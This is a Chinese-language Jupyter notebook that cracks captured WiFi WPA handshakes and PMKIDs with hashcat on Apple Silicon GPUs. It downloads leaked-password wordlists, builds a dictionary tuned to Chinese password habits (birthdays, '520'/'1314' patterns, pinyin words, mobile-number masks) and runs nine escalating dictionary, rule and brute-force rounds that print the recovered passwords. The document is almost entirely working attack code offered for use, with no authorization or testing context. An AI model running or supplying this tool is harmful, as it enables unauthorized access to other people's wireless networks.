# WiFi握手包本地GPU破解 - macOS Metal

**环境**: macOS + Apple Silicon (M1/M2/M3/M4) + hashcat Metal

**使用方法**:
1. 运行第1个Cell检测环境
2. 运行第2个Cell下载字典
3. 在第3个Cell的 `RAW_PASTE` 中粘贴hashline（支持多条）
4. 运行第4个Cell开始破解

| GPU | WPA速度 | 8位数字 |
|-----|---------|--------|
| M1 | ~52K H/s | ~32分钟 |
| M2 | ~70K H/s | ~24分钟 |
| M3 Pro | ~100K H/s | ~17分钟 |

## 1. 环境检测

In [ ]:
import os, subprocess, sys, platform, time, re, shutil

# ── 检测macOS环境 ──
assert platform.system() == 'Darwin', f'此Notebook仅支持macOS，当前系统: {platform.system()}'
print(f'系统: macOS {platform.mac_ver()[0]}')
print(f'芯片: {platform.processor() or subprocess.getoutput("sysctl -n machdep.cpu.brand_string")}')
print()

# ── 检测hashcat ──
HASHCAT = shutil.which('hashcat')
assert HASHCAT, 'hashcat未安装！请运行: brew install hashcat'
ver = subprocess.getoutput(f'{HASHCAT} --version')
print(f'hashcat: {HASHCAT} ({ver})')

# ── 检测GPU ──
r = subprocess.run([HASHCAT, '-I'], capture_output=True, text=True, timeout=15)
for line in (r.stdout + r.stderr).split('\n'):
    if any(kw in line for kw in ['Device', 'Name', 'Type', 'Metal', 'OpenCL']):
        print(f'  {line.strip()}')

# ── 工作目录 ──
WORK = os.path.join(os.path.expanduser('~'), 'wifi-crack-work')
DICT_DIR = os.path.join(WORK, 'dicts')
os.makedirs(DICT_DIR, exist_ok=True)
print(f'\n工作目录: {WORK}')
print('环境检测通过!')

## 2. 下载字典 + 生成中国定制密码

In [ ]:
def dl(url, path, desc):
    if os.path.exists(path) and os.path.getsize(path) > 100:
        print(f'  [已有] {desc}: {int(subprocess.getoutput(f"wc -l < {path}").strip() or 0):,} 条')
        return
    print(f'  [下载] {desc}...')
    if url.endswith('.gz'):
        subprocess.run(['curl','-sL',url,'-o',path+'.gz'], timeout=120)
        subprocess.run(['gunzip','-f',path+'.gz'], capture_output=True)
    else:
        subprocess.run(['curl','-sL',url,'-o',path], timeout=300)
    if os.path.exists(path):
        print(f'  [完成] {desc}: {int(subprocess.getoutput(f"wc -l < {path}").strip() or 0):,} 条')

D_WPA = os.path.join(DICT_DIR, 'wpa-sec.txt')
dl('https://wpa-sec.stanev.org/dict/cracked.txt.gz', D_WPA, 'wpa-sec(~75万)')

D_PROB = os.path.join(DICT_DIR, 'probable.txt')
dl('https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt', D_PROB, 'Probable(~20万)')

D_SEC = os.path.join(DICT_DIR, 'seclists.txt')
dl('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt', D_SEC, 'SecLists(10K)')

# ── 中国定制字典 ──
D_CN = os.path.join(DICT_DIR, 'china.txt')
if os.path.exists(D_CN) and os.path.getsize(D_CN) > 1000:
    print(f'  [已有] 中国定制: {int(subprocess.getoutput(f"wc -l < {D_CN}").strip() or 0):,} 条')
else:
    print('  [生成] 中国定制字典...')
    seen=set(); count=[0]
    with open(D_CN,'w') as f:
        def a(s):
            if len(s)>=8 and s not in seen: seen.add(s); f.write(s+'\n'); count[0]+=1
        for d in '0123456789': a(d*8); a(d*9)
        for s in range(10):
            a(''.join(str((s+i)%10) for i in range(8)))
            a(''.join(str((s-i)%10) for i in range(8)))
        for x in range(10):
            for y in range(10):
                for z in range(10):
                    for w in range(10): a(f'{x}{x}{y}{y}{z}{z}{w}{w}')
        for n in range(10000): s=f'{n:04d}'; a(s+s); a(s+s[::-1])
        for y in range(1960,2012):
            for m in range(1,13):
                for d in range(1,32):
                    if m in(4,6,9,11)and d>30:continue
                    if m==2 and d>29:continue
                    a(f'{y:04d}{m:02d}{d:02d}'); a(f'{m:02d}{d:02d}{y:04d}')
        for i in range(100000): a(f'520{i:05d}'); a(f'{i:05d}520')
        for i in range(10000): a(f'1314{i:04d}'); a(f'{i:04d}1314')
        for py in['woaini','nihao','mima','baobei','laogong','laopo','wechat','weixin','taobao','jiayou']:
            for sx in['123','1234','12345','123456','12345678','888','666','520','1314','0000','9999']:
                a(py+sx); a(py.capitalize()+sx)
        for c in'abcdefghijklmnopqrstuvwxyz':
            for nm in['1234567','12345678','123456789','11111111','88888888','00000000']:
                a(c+nm); a(nm+c)
        for c1 in'abcdefghijklmnopqrstuvwxyz':
            for c2 in'abcdefghijklmnopqrstuvwxyz':
                for nm in['123456','1234567','888888','666666']: a(c1+c2+nm)
        p4=['0000','1111','2222','3333','4444','5555','6666','7777','8888','9999','1234','5678','1314','0520']
        for p1 in p4:
            for p2 in p4: a(p1+p2)
            for n in range(10000): a(p1+f'{n:04d}')
    print(f'  [完成] 中国定制: {count[0]:,} 条')

ALL_DICTS = [d for d in [D_WPA, D_CN, D_PROB, D_SEC] if os.path.exists(d)]
print(f'\n字典: {len(ALL_DICTS)} 个')

## 3. 粘贴hashline（支持多条，自动分割识别）

In [ ]:
# ╔════════════════════════════════════════════════════════════╗
# ║  在下方粘贴所有hashline（一次粘贴多条，每行一条）         ║
# ╚════════════════════════════════════════════════════════════╝
RAW_PASTE = """
在这里粘贴hashline:
WPA*02*3a2d4499120ed27d25e3ddcf605578a3*5e33f725fd21*aabbccddeeff*69514f4f204e656f3130*0ccf364d...
"""

# ── 自动分割识别 ──
hashlines = []
for line in re.split(r'[\r\n]+', RAW_PASTE):
    line = line.strip()
    if not line or not line.startswith('WPA*'): continue
    parts = line.split('*')
    if len(parts) >= 6 and parts[1] in ('01','02'):
        if line not in hashlines:
            hashlines.append(line)

# 也扫描本地.22000文件
import glob
for fp in glob.glob(os.path.join(WORK, '**/*.22000'), recursive=True):
    with open(fp) as f:
        for l in f:
            l = l.strip()
            if l.startswith('WPA*') and l not in hashlines:
                hashlines.append(l)

HASH_FILE = os.path.join(WORK, 'all_hashes.22000')
with open(HASH_FILE, 'w') as f:
    for h in hashlines: f.write(h + '\n')

print(f'加载 {len(hashlines)} 个握手包:\n')
for i, h in enumerate(hashlines):
    p = h.split('*')
    t = 'PMKID' if p[1]=='01' else 'EAPoL'
    try: ssid = bytes.fromhex(p[5]).decode('utf-8', errors='replace')
    except: ssid = p[5][:20]
    mac = p[3]; bssid = ':'.join(mac[j:j+2] for j in range(0,12,2)) if len(mac)==12 else mac
    sta = p[4]
    ok = '✓' if sta != '000000000000' else '✗ MAC_STA全零'
    print(f'  {i+1}. {ssid:<24s} {bssid}  [{t}] {ok}')

## 4. 9轮递进攻击（每轮即时显示结果）

In [ ]:
POTFILE = os.path.join(WORK, 'hashcat.potfile')
OUTFILE = os.path.join(WORK, 'cracked.txt')
for f in [POTFILE, OUTFILE]:
    if os.path.exists(f): os.remove(f)

def show_cracked():
    if not os.path.exists(POTFILE): return 0
    results = []
    with open(POTFILE) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                hp, pw = line.rsplit(':', 1)
                parts = hp.split('*')
                ssid = ''
                if len(parts) >= 6:
                    try: ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
                    except: ssid = parts[5][:20]
                results.append((ssid, pw))
    if results:
        print()
        print('  ╔════════════════════════════════════════╗')
        print('  ║         发现密码！                     ║')
        print('  ╠════════════════════════════════════════╣')
        for ssid, pw in results:
            print(f'  ║  {ssid}: {pw}')
        print('  ╚════════════════════════════════════════╝')
    return len(results)

def run_hc(name, args, timeout_sec=7200):
    print(f'\n{"─"*60}')
    print(f'  {name}')
    print(f'{"─"*60}')
    cmd = [HASHCAT,'-m','22000',HASH_FILE,'--potfile-path',POTFILE,
           '--outfile',OUTFILE,'--outfile-format','2','-w','3','-O'] + args
    t = time.time()
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        print(f'  超时({timeout_sec//60}分钟)'); return False
    except FileNotFoundError:
        print(f'  hashcat未找到'); return False
    for l in out.split('\n'):
        if 'Speed' in l: print(f'  {l.strip()}'); break
    print(f'  耗时: {time.time()-t:.1f}秒')
    n = show_cracked()
    total = len(hashlines)
    bar = '█' * int(n/max(total,1)*20) + '░' * (20 - int(n/max(total,1)*20))
    print(f'  进度: [{n}/{total}] {bar} {n*100//max(total,1)}%')
    return n >= total

def merge(dl, out):
    seen = set()
    with open(out, 'w') as f:
        for d in dl:
            if os.path.exists(d):
                for l in open(d): l=l.strip(); 
                if l and l not in seen: seen.add(l); f.write(l+'\n')
    return len(seen)

print(f'目标: {len(hashlines)} 个握手包 | hashcat: {HASHCAT}')
t0 = time.time(); done = False

# 字典攻击
if not done and os.path.exists(D_WPA):
    done = run_hc('1/9: wpa-sec全球字典(~75万)', ['-a','0',D_WPA])
if not done and os.path.exists(D_CN):
    done = run_hc('2/9: 中国定制字典(~150万)', ['-a','0',D_CN])
if not done:
    mg = os.path.join(WORK,'merged.txt')
    extra = [d for d in [D_PROB,D_SEC] if os.path.exists(d)]
    if extra:
        n = merge(extra, mg)
        done = run_hc(f'3/9: Probable+SecLists({n:,}条)', ['-a','0',mg])
if not done:
    am = os.path.join(WORK,'all.txt')
    merge(ALL_DICTS, am)
    rule = ''
    for rp in ['/opt/homebrew/share/hashcat/rules/best64.rule',
               '/usr/local/share/hashcat/rules/best64.rule',
               '/usr/share/hashcat/rules/best64.rule']:
        if os.path.exists(rp): rule=rp; break
    if rule: done = run_hc('4/9: 全字典+best64规则(×64倍)', ['-a','0',am,'-r',rule], 3600)

# 掩码暴力
if not done: done = run_hc('5/9: 8位纯数字(1亿)', ['-a','3','?d?d?d?d?d?d?d?d'])
if not done:
    mf = os.path.join(WORK,'pfx.hcmask')
    with open(mf,'w') as f:
        for c in 'aqzwsxedcrfvtgbyhnujm': f.write(f'{c}?d?d?d?d?d?d?d\n')
    done = run_hc('6/9: 字母+7位数字', ['-a','3',mf], 3600)
if not done: done = run_hc('7/9: 9位纯数字(10亿)', ['-a','3','?d?d?d?d?d?d?d?d?d'], 14400)
if not done: done = run_hc('8/9: 手机号(1+10位)', ['-a','3','1?d?d?d?d?d?d?d?d?d?d'], 14400)
if not done: done = run_hc('9/9: 10位纯数字(100亿)', ['-a','3','?d?d?d?d?d?d?d?d?d?d'], 21600)

print(f'\n{"═"*60}')
print(f'  全部9轮完成 | 总耗时: {(time.time()-t0)/60:.1f}分钟')
n = show_cracked()
if n == 0: print('  未破解任何密码。建议检查握手包完整性。')
print(f'{"═"*60}')

## 5. 查看破解结果

In [ ]:
print('hashcat --show 输出:')
r = subprocess.run([HASHCAT,'-m','22000',HASH_FILE,'--potfile-path',POTFILE,'--show'],
                   capture_output=True, text=True, timeout=30)
if r.stdout:
    for line in r.stdout.strip().split('\n'):
        if ':' in line:
            hp, pw = line.rsplit(':', 1)
            parts = hp.split('*')
            ssid = ''
            if len(parts) >= 6:
                try: ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
                except: ssid = parts[5][:20]
            print(f'  {ssid}: {pw}')
else:
    print('  无结果')